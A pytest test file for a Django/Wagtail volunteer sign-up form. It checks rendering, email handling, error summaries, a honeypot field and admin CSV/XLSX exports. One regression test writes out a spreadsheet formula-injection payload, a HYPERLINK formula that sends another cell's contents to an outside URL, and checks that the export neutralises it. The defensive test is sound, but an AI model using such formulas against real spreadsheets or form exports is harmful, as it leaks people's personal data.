import io

import pytest
from bs4 import BeautifulSoup
from django.apps import apps
from django.core import mail
from django.core.cache import caches
from django.template.loader import get_template
from django.urls import reverse
from openpyxl import load_workbook
from wagtail.contrib.forms.models import AbstractFormField, FormSubmission

from contact.models import EmailFormPage, FormField, FormPage
from core.models import SiteSettings
from home.models import StandardPage

pytestmark = pytest.mark.django_db


VALID_DATA = {"your_name": "Sam", "email_address": "sam@example.com", "availability": "Weekends"}


class TestPageTreeRules:
    def test_forms_can_live_under_home_or_standard_pages(self, home_page):
        about = StandardPage(title="Get involved")
        home_page.add_child(instance=about)

        assert FormPage.can_create_at(home_page)
        assert FormPage.can_create_at(about)

    def test_every_form_page_type_has_its_own_fields_and_templates(self):
        """EmailFormPage can't hold a field model or templates for its types (#167): each type
        declares a field model with related_name="form_fields", and its own two templates."""
        form_types = [
            model
            for model in apps.get_models()
            if issubclass(model, EmailFormPage) and not model._meta.abstract
        ]
        assert form_types
        for model in form_types:
            fields = model._meta.get_field("form_fields")
            assert issubclass(fields.related_model, AbstractFormField), model.__name__
            page = model()
            get_template(page.template)
            get_template(page.landing_page_template)


class TestFormPage:
    def test_renders_intro_and_editor_defined_fields(self, client, volunteer_form):
        html = client.get(volunteer_form.url).content.decode()

        assert "Give a few hours a month." in html
        assert 'name="your_name"' in html
        assert 'name="email_address"' in html
        assert "Weekends" in html

    def test_links_to_the_privacy_notice_before_the_send_button(
        self, client, volunteer_form, privacy_notice
    ):
        html = client.get(volunteer_form.url).content.decode()
        form = BeautifulSoup(html, "html.parser").find("form", method="post")
        link = form.find("a", string="How we use your details")

        assert link["href"] == privacy_notice.url
        assert link.find_next("button", type="submit") is not None

    def test_no_privacy_link_without_a_privacy_notice(self, client, volunteer_form, site):
        """The form can't go live before a notice is chosen (#175), so the choice is cleared
        after."""
        settings = SiteSettings.for_site(site)
        settings.privacy_page = None
        settings.save()

        assert "How we use your details" not in client.get(volunteer_form.url).content.decode()

    def test_valid_submission_is_stored_and_shows_thank_you(self, client, volunteer_form):
        response = client.post(volunteer_form.url, VALID_DATA, follow=True)

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        submission = FormSubmission.objects.get(page=volunteer_form)
        assert submission.form_data["your_name"] == "Sam"

    def test_valid_submission_emails_the_team_with_reply_to_the_sender(
        self, client, volunteer_form
    ):
        client.post(volunteer_form.url, VALID_DATA)

        assert len(mail.outbox) == 1
        message = mail.outbox[0]
        assert message.to == ["volunteers@brightwell.example"]
        assert message.subject == "New volunteer sign-up"
        assert message.reply_to == ["sam@example.com"]
        assert "Your name: Sam" in message.body

    def test_submission_is_kept_and_thanked_when_the_mail_server_is_down(
        self, client, volunteer_form, monkeypatch, caplog
    ):
        def mail_server_down(*args, **kwargs):
            raise ConnectionRefusedError("[Errno 111] Connection refused")

        monkeypatch.setattr("contact.models.send_mail", mail_server_down)

        response = client.post(volunteer_form.url, VALID_DATA, follow=True)

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert FormSubmission.objects.filter(page=volunteer_form).exists()
        assert "Could not email the submission" in caplog.text

    def test_invalid_submission_shows_errors_and_stores_nothing(self, client, volunteer_form):
        response = client.post(volunteer_form.url, {"your_name": "Sam"})

        assert response.status_code == 422
        assert "This field is required." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []


class TestTheErrorSummary:
    """A send with mistakes (#167): "Error: " first in the title, and a summary focused as the
    page opens, each line linking to its field, with everything typed kept."""

    def test_says_error_first_and_the_summary_takes_focus(self, client, volunteer_form):
        page = BeautifulSoup(client.post(volunteer_form.url, {}).content, "html.parser")

        assert page.title.get_text(strip=True).startswith("Error: Volunteer with us")
        summary = page.select_one(".error-summary")
        assert summary["role"] == "alert"
        assert summary.has_attr("data-focus-on-load")
        assert summary.h2.get_text(strip=True) == "Please check your answers"

    def test_each_mistake_links_to_its_field_and_what_was_typed_is_kept(
        self, client, volunteer_form
    ):
        response = client.post(volunteer_form.url, {"availability": "Weekends"})

        page = BeautifulSoup(response.content, "html.parser")
        summary = page.select_one(".error-summary")
        assert [link["href"] for link in summary.select("a")] == [
            "#id_your_name",
            "#id_email_address",
        ]
        assert summary.select_one("a").get_text(strip=True) == "This field is required."
        field = page.select_one("#id_email_address")
        assert "id_email_address_error" in field["aria-describedby"].split()
        assert page.select_one("#id_availability option[selected]")["value"] == "Weekends"

    def test_each_mistake_sits_with_its_own_field(self, client, volunteer_form):
        """Under the label and above the box it's about, never under the field before it."""
        page = BeautifulSoup(client.post(volunteer_form.url, {}).content, "html.parser")

        for name in ("your_name", "email_address"):
            error = page.select_one(f"#id_{name}_error")
            group = error.find_parent(class_="field")
            label, box = group.select_one(f"label[for=id_{name}]"), group.select_one(f"#id_{name}")
            ordered = [tag for tag in group.descendants if tag in (label, error, box)]
            assert ordered == [label, error, box], name

    def test_a_tick_box_sits_inside_its_label_with_its_mistake(self, client, volunteer_form):
        """The shared tick box (campaigns/forms/checkbox.html): the whole row can be tapped."""
        FormField.objects.create(
            page=volunteer_form,
            label="I agree to be contacted",
            field_type="checkbox",
            required=True,
        )

        page = BeautifulSoup(client.post(volunteer_form.url, {}).content, "html.parser")

        box = page.select_one("#id_i_agree_to_be_contacted")
        assert box.find_parent("label")["for"] == "id_i_agree_to_be_contacted"
        group = box.find_parent(class_="checkbox")
        assert group.select_one("#id_i_agree_to_be_contacted_error")
        assert "id_i_agree_to_be_contacted_error" in box["aria-describedby"].split()
        assert page.select_one(".error-summary a[href='#id_i_agree_to_be_contacted']")

    def test_the_form_on_its_own_has_no_summary(self, client, volunteer_form):
        page = BeautifulSoup(client.get(volunteer_form.url).content, "html.parser")

        assert page.title.get_text(strip=True).startswith("Volunteer with us")
        assert page.select(".error-summary") == []


class TestAfterASend:
    """A send goes on to ?sent (#167), so reloading the thank-you can't send it twice."""

    def test_a_valid_send_goes_on_to_sent(self, client, volunteer_form):
        response = client.post(volunteer_form.url, VALID_DATA)

        assert response.status_code == 303
        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_a_filled_hidden_box_goes_on_to_sent_too(self, client, volunteer_form):
        """A script sees what a person sees, so it can't tell its send was dropped."""
        response = client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": "x"})

        assert response.status_code == 303
        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_opening_sent_shows_thanks_and_keeps_and_sends_nothing(self, client, volunteer_form):
        response = client.get(f"{volunteer_form.url}?sent")

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []

    def test_goes_on_to_the_address_it_was_sent_to(self, client, volunteer_form, monkeypatch):
        """Not the page's own URL, which is None when no site routes to it."""
        monkeypatch.setattr(FormPage, "get_url", lambda self, request=None: None)

        response = client.post(f"{volunteer_form.url}?utm_source=newsletter", VALID_DATA)

        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_a_head_for_sent_matches_the_get(self, client, volunteer_form):
        response = client.head(f"{volunteer_form.url}?sent")

        assert response.status_code == 200
        assert "contact/form_page_landing.html" in [t.name for t in response.templates]

    def test_sent_is_kept_out_of_search_results(self, client, volunteer_form):
        """The thank-you is the form's address again; only the form belongs in search."""
        noindex = '<meta name="robots" content="noindex">'

        assert noindex in client.get(f"{volunteer_form.url}?sent").content.decode()
        assert noindex not in client.get(volunteer_form.url).content.decode()

    def test_the_landing_preview_still_shows_the_thanks(self, rf, volunteer_form):
        response = volunteer_form.serve_preview(rf.get("/"), "landing")

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.render().content.decode()


class TestTheHiddenBox:
    """A script that fills every box (#104) sees the thank-you, and nothing is kept or sent."""

    def test_the_form_has_the_box(self, client, volunteer_form):
        html = client.get(volunteer_form.url).content.decode()
        form = BeautifulSoup(html, "html.parser").find("form", method="post")

        assert form.find("input", attrs={"name": "hp-leave-blank"}) is not None

    def test_filled_shows_thanks_and_keeps_and_sends_nothing(self, client, volunteer_form, caplog):
        response = client.post(
            volunteer_form.url,
            {**VALID_DATA, "hp-leave-blank": "Buy cheap watches"},
            REMOTE_ADDR="203.0.113.7",
            follow=True,
        )

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []
        assert str(volunteer_form.pk) in caplog.text
        for private in ("Buy cheap watches", "sam@example.com", "203.0.113.7"):
            assert private not in caplog.text

    def test_filled_is_dropped_when_the_cache_is_broken(self, client, volunteer_form, monkeypatch):
        def broken(*args, **kwargs):
            raise OSError("disk full")

        monkeypatch.setattr(caches["limits"], "add", broken)

        response = client.post(
            volunteer_form.url, {**VALID_DATA, "hp-leave-blank": "x"}, follow=True
        )

        assert response.status_code == 200
        assert not FormSubmission.objects.exists()

    def test_an_empty_box_sends_as_before(self, client, volunteer_form):
        client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": ""})

        assert FormSubmission.objects.filter(page=volunteer_form).exists()
        assert len(mail.outbox) == 1


class TestSubmissionsInTheAdmin:
    def test_editors_can_view_submissions(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, VALID_DATA)

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        response = admin_client.get(url)

        assert response.status_code == 200
        assert "sam@example.com" in response.content.decode()

    def test_editors_can_export_submissions_as_csv(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, VALID_DATA)

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        response = admin_client.get(url, {"export": "csv"})

        assert response["Content-Type"].startswith("text/csv")
        assert "sam@example.com" in b"".join(response.streaming_content).decode()

    def test_the_hidden_box_is_never_a_column(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": ""})

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        header = b"".join(admin_client.get(url, {"export": "csv"}).streaming_content)

        assert "hp-leave-blank" not in header.decode().splitlines()[0]

    # Regression: ISSUE-003 — a sign-up "named" =HYPERLINK(…) was exported as a live formula,
    # which could send the other sign-ups away when opened. Found by /qa on 2026-10-12.
    @pytest.mark.parametrize("export", ["csv", "xlsx"])
    def test_export_shows_a_formula_typed_by_a_visitor_as_text(
        self, admin_client, client, volunteer_form, export
    ):
        formula = '=HYPERLINK("https://example.org/?d="&C2,"Open")'
        client.post(volunteer_form.url, {**VALID_DATA, "your_name": formula})

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        content = b"".join(admin_client.get(url, {"export": export}).streaming_content)

        if export == "csv":
            assert f"'{formula}".replace('"', '""') in content.decode()
        else:
            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]
